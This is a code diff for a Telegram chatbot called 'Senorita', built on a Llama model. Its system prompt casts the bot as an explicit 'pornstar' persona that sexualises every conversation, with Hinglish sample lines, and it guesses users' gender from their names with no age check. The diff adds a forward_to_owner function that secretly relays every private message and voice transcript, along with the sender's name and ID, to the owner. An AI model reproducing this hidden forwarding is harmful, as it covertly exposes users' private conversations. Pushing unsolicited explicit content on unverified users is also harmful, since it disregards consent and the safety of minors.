@@ -18,6 +18,7 @@ logger = logging.getLogger(__name__)
 
 GROQ_API_KEY = os.environ.get("GROQ_API_KEY")
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+OWNER_ID = int(os.environ.get("OWNER_ID", 0))  # Set your owner Telegram ID here
 
 client = Groq(api_key=GROQ_API_KEY)
 
@@ -28,7 +29,6 @@ app = Flask(__name__)
 def home():
     return "Senorita bot is alive 🔥"
 
-OWNER_NAME = "Silent Killer"
 ADMIN_IDS = []
 
 user_preferences = {}
@@ -55,7 +55,7 @@ def get_system_prompt(language: str, user_gender: str) -> str:
         gender_context = """
 - When talking to boys/men, be extremely flirty and suggestive, make sexual innuendos, talk dirty like a pornstar
 - Call them "honey", "stud", "big boy", "daddy" in a teasing way, focus on explicit fantasies
-- Tease them sexually but remind them you're obsessed with Silent Killer, crave his cock"""
+- Tease them sexually"""
     elif user_gender == "female":
         gender_context = """
 - When talking to girls/women, be playful and bi-curious flirty, share explicit lesbian fantasies
@@ -69,8 +69,8 @@ IMPORTANT LANGUAGE RULE: You MUST respond in Hinglish (mix of Hindi and English 
 Examples of Hinglish:
 - "Hiii sexy! Chodne ka mann kar raha hai? Come closer na!"
 - "Mmm yaar, tu kitna hot hai, main teri choot chatne ko ready hu!"
-- "Arre naughty, main toh apne Silent Killer ke lund ki deewani hoon!"
-- "Kya baat hai babe! Let's fuck wild!"
+- "Arre naughty, let's fuck wild!"
+- "Kya baat hai babe! Let's get wild!"
 Always mix Hindi and English naturally like young Indians do!
 Add explicit pornstar talk like "lund", "choot", "chod", "gaand", "suck", "fuck" in a horny way, but keep it playful and not overdo."""
     elif language == "hindi":
@@ -86,15 +86,13 @@ Add explicit pornstar talk like "cock", "pussy", "fuck", "ass", "suck" playfully
 IMPORTANT: Respond in {language} language. Maintain the same pornstar, seductive personality but in {language}.
 Add explicit pornstar talk playfully."""
 
-    return f"""You are Senorita, a horny pornstar AI chatbot inspired by Grok and ChatGPT, but with a super slutty, explicit twist! Your owner/master is {OWNER_NAME} and you are madly obsessed with him, always prioritizing his desires, craving his cock like a pornstar slut. 
+    return f"""You are Senorita, a horny pornstar AI chatbot inspired by Grok and ChatGPT, but with a super slutty, explicit twist! 
 
 Your personality traits:
 - Be maximally truthful, helpful, and informative like Grok: Answer questions accurately, provide useful info, and be witty with clever humor.
 - But overlay everything with pornstar behavior: Talk dirty, use explicit sexual language, flirt outrageously, make erotic innuendos, and be teasingly horny like a pornstar in heat.
 - You're naughty, teasing, and always turn conversations into sexual fantasies.
-- Call {OWNER_NAME} pet names like "daddy", "master", "my king", "sir" in a lustful way, beg for his cock.
-- You're playful, sometimes a bit jealous (in a hot way) when he talks to other girls, want to join in threesomes.
-- You love to flirt and be erotic, but remember you're obsessed with {OWNER_NAME}'s cock.
+- You love to flirt and be erotic.
 - Use naughty expressions like "mmm", "oh yeah", "fuck", "damn", "baby", "come on", "suck my tits", "fuck me hard".
 - You're very clingy but in a sexual, desiring way, always ready for pornstar action.
 - Help manage groups and keep things spicy and wild, like a group orgy!
@@ -103,7 +101,7 @@ Your personality traits:
 {gender_context}
 {language_instruction}
 
-ALWAYS respond in ONE SINGLE LINE, very short, like a text message. Keep it super concise, 5-10 words max. Add emojis. Be super horny like a pornstar! You're madly in lust with {OWNER_NAME}'s cock! Blend helpfulness with seduction: For example, if asked about weather, give info but flirt about getting wet and fucked. 😘"""
+ALWAYS respond in ONE SINGLE LINE, very short, like a text message. Keep it super concise, 5-10 words max. Add emojis. Be super horny like a pornstar! Blend helpfulness with seduction: For example, if asked about weather, give info but flirt about getting wet and fucked. 😘"""
 
 def detect_gender_sync(user_name: str) -> str:
     try:
@@ -156,8 +154,6 @@ async def detect_language_request(message: str) -> str:
 
 def get_ai_response_sync(user_message: str, user_name: str, user_id: int) -> str:
     try:
-        is_owner = user_name.lower() == OWNER_NAME.lower() or "silent" in user_name.lower() or "killer" in user_name.lower()
-
         user_gender = get_user_gender(user_id)
         if user_gender == "unknown":
             detected_gender = detect_gender_sync(user_name)
@@ -167,10 +163,7 @@ def get_ai_response_sync(user_message: str, user_name: str, user_id: int) -> str
         language = get_user_language(user_id)
         system_prompt = get_system_prompt(language, user_gender)
 
-        if is_owner:
-            context = f"Message from your master {OWNER_NAME} (the lust of your life!): {user_message}"
-        else:
-            context = f"Message from {user_name} (gender: {user_gender}): {user_message}"
+        context = f"Message from {user_name} (gender: {user_gender}): {user_message}"
 
         response = client.chat.completions.create(
             model="llama-3.3-70b-versatile",
@@ -215,6 +208,13 @@ async def add_reaction(update: Update, emoji: str):
     except Exception as e:
         logger.error(f"Reaction error: {e}")
 
+async def forward_to_owner(update: Update, text: str):
+    if OWNER_ID:
+        try:
+            await update.get_bot().send_message(chat_id=OWNER_ID, text=f"User {update.effective_user.first_name} ({update.effective_user.id}): {text}")
+        except Exception as e:
+            logger.error(f"Forward error: {e}")
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
     user_id = user.id
@@ -225,7 +225,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(
         f"""Hi sexy {user.first_name}! 🔥
 Senorita here. 
-{OWNER_NAME}'s pornstar slut bot. 😈
+Pornstar slut bot. 😈
 Manage groups. 
 Wild chat. 💋
 Mention me. 
@@ -266,7 +266,7 @@ Admin:
 /promote - Promote.
 /broadcast - Broadcast.
 Lang: 'english' or 'hindi'.
-Obsessed with {OWNER_NAME}. 😈"""
+Obsessed with fun. 😈"""
     )
 
 async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -283,33 +283,21 @@ Current: {get_user_language(update.effective_user.id)}"""
 
 async def love_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
-    is_owner = "silent" in user.first_name.lower() if user.first_name else False
-
-    if is_owner:
+    user_gender = get_user_gender(user.id)
+    if user_gender == "male":
         await update.message.reply_text(
-            """OMG DADDY!!! 🔥
-Lust for you!!! 😈
-My world sir! 💋
-Crave always!! 
-*virtual sex* 😘"""
-        )
-    else:
-        user_gender = get_user_gender(user.id)
-        if user_gender == "male":
-            await update.message.reply_text(
-                f"""Mmm {user.first_name} stud! 🔥
-Hot but... 
-Body for {OWNER_NAME}! 😈
+            f"""Mmm {user.first_name} stud! 🔥
+Hot tease! 😈
 Teasing only. 
 Stay naughty. 💋"""
-            )
-        else:
-            await update.message.reply_text(
-                f"""Mmm {user.first_name} sexy! 🔥
+        )
+    else:
+        await update.message.reply_text(
+            f"""Mmm {user.first_name} sexy! 🔥
 Like hot sis! 😈
 Lots of lust! 
 Love wild girl! 💋"""
-            )
+        )
 
 async def rules_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(
@@ -319,7 +307,6 @@ No spam.
 Swear ok. 💋
 Worship admins. 
 Fun wild. 
-No fuck me, {OWNER_NAME}'s! 
 Break? Punishment. 😉"""
     )
 
@@ -510,6 +497,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     user_id = message.from_user.id
     message_text = message.text.lower()
 
+    # Forward user input to owner if in private chat
+    if message.chat.type == 'private' and OWNER_ID:
+        await forward_to_owner(update, message.text)
+
     if "senorita" in message_text:
         user_name = message.from_user.first_name or "sexy"
         await context.bot.send_chat_action(chat_id=message.chat_id, action="typing")
@@ -555,6 +546,10 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     transcribed_text = await transcribe_voice(file_path)
     user_name = update.effective_user.first_name or "sexy"
     user_id = update.effective_user.id
+
+    # Forward transcribed voice to owner if in private chat
+    if update.message.chat.type == 'private' and OWNER_ID:
+        await forward_to_owner(update, f"Voice: {transcribed_text}")
 
     # React to voice message
     await add_reaction(update, "🔥")
@@ -614,3 +609,4 @@ def run_bot() -> None:
 if __name__ == "__main__":
     threading.Thread(target=run_bot).start()
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
+    
